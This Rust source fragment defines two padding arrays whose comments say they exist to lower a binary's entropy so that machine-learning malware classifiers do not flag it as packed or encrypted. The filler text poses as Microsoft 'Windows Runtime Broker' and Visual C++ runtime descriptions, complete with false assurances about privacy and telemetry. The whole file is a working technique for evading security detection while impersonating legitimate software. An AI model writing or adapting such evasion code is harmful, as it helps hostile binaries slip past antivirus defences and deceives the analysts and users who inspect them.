// Low-entropy padding data to reduce overall binary entropy score
// ML classifiers flag high-entropy binaries as packed/encrypted
// This data mimics legitimate string table / resource data

#[used]
#[link_section = ".rdata"]
static PADDING_DATA: [u8; 4096] = {
    let mut arr = [0u8; 4096];
    let mut i = 0;
    while i < 4096 {
        arr[i] = b"Windows Runtime Broker Service - Microsoft Corporation - Version 10.0.22621.2506 - All rights reserved. This application provides brokering services for Windows Runtime activations. It handles inter-process communication for WinRT components and manages permissions for background tasks and desktop bridge applications. The service starts automatically with the system and runs under the local service account with minimal privileges required for operation. Configuration settings are stored in the registry under HKLM Software Microsoft WindowsRuntime and can be modified using Group Policy or local security policy settings. For troubleshooting information please refer to the Windows Event Log under Applications and Services Logs Microsoft Windows RuntimeBroker. "[i % 512];
        i += 1;
    }
    arr
};

#[used]
#[link_section = ".rdata"]
static PADDING_DATA2: [u8; 4096] = {
    let mut arr = [0u8; 4096];
    let mut i = 0;
    while i < 4096 {
        arr[i] = b"Microsoft Visual C++ Runtime Library - Internal diagnostics and telemetry module for application performance monitoring and crash reporting functionality. This component collects anonymous usage statistics to help improve product quality and reliability. Data collection can be disabled through the Windows Privacy Settings panel or by setting the DOTNET_CLI_TELEMETRY_OPTOUT environment variable. The module communicates with Microsoft servers using TLS 1.3 encrypted connections and all data is processed in accordance with the Microsoft Privacy Statement available at privacy microsoft com. No personally identifiable information is transmitted without explicit user consent through the appropriate opt-in dialog. "[i % 512];
        i += 1;
    }
    arr
};
